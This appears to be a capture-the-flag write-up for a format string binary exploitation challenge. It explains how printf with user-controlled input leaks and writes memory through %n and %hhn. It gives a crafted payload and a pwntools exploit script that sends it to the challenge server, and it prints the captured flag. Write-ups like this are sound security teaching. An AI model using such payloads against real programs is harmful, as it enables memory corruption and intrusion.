# Format

Category: Binary Exploitation, Format String
Created: Nov 8, 2020 12:22 PM
Points: 300
Solved: Yes
Subjective Difficulty: 🔥🔥🔥

# WriteUp:

## 🔎 Research:

We are given a program that basically prints out our given input.

## 📝 Vulnerability Description:

The `printf` function accepts format specifier to print out user input. When printing user input without format specifiers, such as `printf(user_controlled_input)` , the user_controlled_input can contain format specifiers, which will leak the contents of memory where the arguments for the format specifier would be stored, e.g. `rsi, rdx, rcx, r8, r9, <stack_memory>...` . (see [Calling Conventions](https://www.notion.so/Calling-Conventions-9793ca23c0674d4089fcb2e1b468f778)).

## 🧠 Exploit Development:

The `%n` specifier writes how much characters are already written inclusive filled format specifiers:

```c
printf("%p%n", 0x1234567812345678, num); // %n would write 0x08 to num
```

When we want to write a single char to an address we can use the  `%hhn` specifier. Here are the specifiers all listed:

[printf](http://www.cplusplus.com/reference/cstdio/printf/)

So this format string would write a char  to `num_addr` by using the format specifier `%hhn` (hh=char)

```python
num_addr = 0x404080
payload = b"%hu%hu%u%p"+b"%u"+b"%p%p"+b"%p%hhnAA"+p64(num_addr)
```

We can prove that that actually overwrites the lowest bit of `num` with `0x42` :

Before overwriting:

![Format%202831b7f5178f459c861f4eb8e42cbfe9/before_overwriting.png](Format%202831b7f5178f459c861f4eb8e42cbfe9/before_overwriting.png)

After overwriting:

![Format%202831b7f5178f459c861f4eb8e42cbfe9/after_overwriting.png](Format%202831b7f5178f459c861f4eb8e42cbfe9/after_overwriting.png)

## 🔐 Exploit Programm:

```python
from pwn import *

num_addr = 0x404080

p = remote("challenges.ctfd.io", 30266)

pause()

payload = b"%hu%hu%u%p"+b"%u"+b"%p%p"+b"%p%hhnAA"+p64(num_addr) 

print(str(payload))

p.recvline() # Give me some text
p.sendline(payload)
r = p.recvline()
print(str(r))
print(p.recvall())
```

## 💥 Run Exploit:

![Format%202831b7f5178f459c861f4eb8e42cbfe9/successfull_exploit.png](Format%202831b7f5178f459c861f4eb8e42cbfe9/successfull_exploit.png)

**FLAG:  nactf{d0nt_pr1ntf_u54r_1nput_HoUaRUxuGq2lVSHM}**

## 🗄️ Summary / Difficulties:

This was a basic Format string exploitation challenge. 

## 🗃️ Further References:

- [Format Strings Exploitation](https://www.notion.so/Format-Strings-Exploitation-73dde030233e43d5a9fff305aa2abf35)
- [Calling Conventions](https://www.notion.so/Calling-Conventions-9793ca23c0674d4089fcb2e1b468f778)

## 🔨 Used Tools:

- [Pwndbg](https://www.notion.so/Pwndbg-2c0c6540dc5444559bb84545f6dbbd48)

---

# Notes:

-